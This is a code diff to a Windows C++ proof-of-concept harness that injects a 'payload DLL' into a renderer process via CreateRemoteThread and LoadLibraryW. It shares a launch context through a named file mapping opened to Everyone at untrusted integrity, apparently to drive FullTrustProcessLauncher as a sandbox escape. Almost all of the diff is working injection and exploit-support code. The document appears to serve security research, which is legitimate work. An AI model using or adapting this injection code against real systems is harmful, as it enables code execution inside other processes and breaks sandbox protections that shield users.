@@ -1,6 +1,7 @@
 #include "poc_context.h"
 
 #include <appmodel.h>
+#include <sddl.h>
 #include <shobjidl_core.h>
 #include <tlhelp32.h>
 #include <winternl.h>
@@ -426,8 +427,7 @@ std::uintptr_t RemoteProcedureAddress(DWORD pid, const wchar_t* module_name,
           reinterpret_cast<std::uintptr_t>(containing_module));
 }
 
-std::uintptr_t InjectLibrary(HANDLE process, DWORD pid,
-                             const std::wstring& dll_path) {
+void InjectLibrary(HANDLE process, const std::wstring& dll_path) {
   const SIZE_T path_size = (dll_path.size() + 1) * sizeof(wchar_t);
   void* remote_path = VirtualAllocEx(process, nullptr, path_size,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -442,8 +442,11 @@ std::uintptr_t InjectLibrary(HANDLE process, DWORD pid,
     ThrowWindowsError("WriteProcessMemory(DLL path)");
   }
 
-  const auto load_library = RemoteProcedureAddress(
-      pid, L"kernel32.dll", "LoadLibraryW");
+  const auto load_library = GetProcAddress(GetModuleHandleW(L"kernel32.dll"),
+                                           "LoadLibraryW");
+  if (!load_library) {
+    ThrowWindowsError("GetProcAddress(LoadLibraryW)");
+  }
   ScopedHandle thread(CreateRemoteThread(
       process, nullptr, 0,
       reinterpret_cast<LPTHREAD_START_ROUTINE>(load_library), remote_path, 0,
@@ -455,8 +458,14 @@ std::uintptr_t InjectLibrary(HANDLE process, DWORD pid,
     throw std::runtime_error("timed out loading the payload DLL");
   }
 
+  DWORD thread_result = 0;
+  if (!GetExitCodeThread(thread.get(), &thread_result)) {
+    ThrowWindowsError("GetExitCodeThread(LoadLibraryW)");
+  }
   VirtualFreeEx(process, remote_path, 0, MEM_RELEASE);
-  return WaitForRemoteModule(pid, BaseName(dll_path));
+  if (!thread_result) {
+    throw std::runtime_error("LoadLibraryW returned null in the renderer");
+  }
 }
 
 LaunchContext RunInjectedPoc(DWORD pid, const std::wstring& dll_path,
@@ -468,6 +477,7 @@ LaunchContext RunInjectedPoc(DWORD pid, const std::wstring& dll_path,
                              const std::wstring& notification_profile,
                              const std::wstring& background_task_name,
                              const std::wstring& application_user_model_id) {
+  (void)local_dll_path;
   const DWORD access = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                        PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_OPERATION |
                        PROCESS_VM_READ | PROCESS_VM_WRITE;
@@ -476,24 +486,10 @@ LaunchContext RunInjectedPoc(DWORD pid, const std::wstring& dll_path,
     ThrowWindowsError("OpenProcess(inject)");
   }
 
-  const auto remote_module = InjectLibrary(process.get(), pid, dll_path);
-  ScopedModule local_module(
-      LoadLibraryExW(local_dll_path.c_str(), nullptr,
-                     DONT_RESOLVE_DLL_REFERENCES));
-  if (!local_module.get()) {
-    ThrowWindowsError("LoadLibraryExW(payload)");
-  }
-  const auto local_entry = GetProcAddress(local_module.get(), "RunPoc");
-  if (!local_entry) {
-    ThrowWindowsError("GetProcAddress(RunPoc)");
-  }
-  const auto remote_entry =
-      remote_module +
-      (reinterpret_cast<std::uintptr_t>(local_entry) -
-       reinterpret_cast<std::uintptr_t>(local_module.get()));
-
   LaunchContext context{};
   context.magic = kPocContextMagic;
+  context.state = 0;
+  context.bootstrap_result = ERROR_IO_PENDING;
   context.call_hresult = E_PENDING;
   context.extended_error = E_PENDING;
   context.launch_result = -1;
@@ -546,44 +542,62 @@ LaunchContext RunInjectedPoc(DWORD pid, const std::wstring& dll_path,
   wcsncpy_s(context.application_user_model_id,
             application_user_model_id.c_str(), _TRUNCATE);
 
-  void* remote_context = VirtualAllocEx(
-      process.get(), nullptr, sizeof(context), MEM_COMMIT | MEM_RESERVE,
-      PAGE_READWRITE);
-  if (!remote_context) {
-    ThrowWindowsError("VirtualAllocEx(context)");
+  PSECURITY_DESCRIPTOR security_descriptor = nullptr;
+  if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
+          L"D:(A;;GA;;;WD)(A;;GA;;;RC)S:(ML;;NW;;;S-1-16-0)",
+          SDDL_REVISION_1, &security_descriptor, nullptr)) {
+    ThrowWindowsError("ConvertStringSecurityDescriptorToSecurityDescriptorW");
+  }
+  SECURITY_ATTRIBUTES security_attributes{};
+  security_attributes.nLength = sizeof(security_attributes);
+  security_attributes.lpSecurityDescriptor = security_descriptor;
+  security_attributes.bInheritHandle = FALSE;
+  ScopedHandle mapping(CreateFileMappingW(
+      INVALID_HANDLE_VALUE, &security_attributes, PAGE_READWRITE, 0,
+      static_cast<DWORD>(sizeof(LaunchContext)), kPocContextMappingName));
+  const DWORD mapping_error = GetLastError();
+  LocalFree(security_descriptor);
+  if (!mapping) {
+    ThrowWindowsError("CreateFileMappingW(context)", mapping_error);
+  }
+  if (mapping_error == ERROR_ALREADY_EXISTS) {
+    throw std::runtime_error("the PoC context mapping already exists");
   }
 
-  SIZE_T bytes_written = 0;
-  if (!WriteProcessMemory(process.get(), remote_context, &context,
-                          sizeof(context), &bytes_written) ||
-      bytes_written != sizeof(context)) {
-    ThrowWindowsError("WriteProcessMemory(context)");
+  auto* shared_context = static_cast<LaunchContext*>(MapViewOfFile(
+      mapping.get(), FILE_MAP_READ | FILE_MAP_WRITE, 0, 0,
+      sizeof(LaunchContext)));
+  if (!shared_context) {
+    ThrowWindowsError("MapViewOfFile(context)");
   }
+  std::memcpy(shared_context, &context, sizeof(context));
+  MemoryBarrier();
+  InterlockedExchange(&shared_context->state, kPocContextReady);
 
-  ScopedHandle thread(CreateRemoteThread(
-      process.get(), nullptr, 0,
-      reinterpret_cast<LPTHREAD_START_ROUTINE>(remote_entry), remote_context, 0,
-      nullptr));
-  if (!thread) {
-    ThrowWindowsError("CreateRemoteThread(RunPoc)");
+  InjectLibrary(process.get(), dll_path);
+
+  bool complete = false;
+  for (int attempt = 0; attempt < 2400; ++attempt) {
+    if (InterlockedCompareExchange(&shared_context->state,
+                                   kPocContextComplete,
+                                   kPocContextComplete) ==
+        kPocContextComplete) {
+      complete = true;
+      break;
+    }
+    Sleep(50);
   }
-  if (WaitForSingleObject(thread.get(), 120000) != WAIT_OBJECT_0) {
+  if (!complete) {
+    UnmapViewOfFile(shared_context);
     throw std::runtime_error("timed out waiting for FullTrustProcessLauncher");
   }
 
-  DWORD thread_result = ERROR_GEN_FAILURE;
-  GetExitCodeThread(thread.get(), &thread_result);
-  if (thread_result != ERROR_SUCCESS) {
+  MemoryBarrier();
+  std::memcpy(&context, shared_context, sizeof(context));
+  UnmapViewOfFile(shared_context);
+  if (context.bootstrap_result != ERROR_SUCCESS) {
     throw std::runtime_error("payload rejected its launch context");
   }
-
-  SIZE_T bytes_read = 0;
-  if (!ReadProcessMemory(process.get(), remote_context, &context,
-                         sizeof(context), &bytes_read) ||
-      bytes_read != sizeof(context)) {
-    ThrowWindowsError("ReadProcessMemory(context)");
-  }
-  VirtualFreeEx(process.get(), remote_context, 0, MEM_RELEASE);
 
   if (context.magic != kPocContextMagic) {
     throw std::runtime_error("payload returned a corrupt launch context");
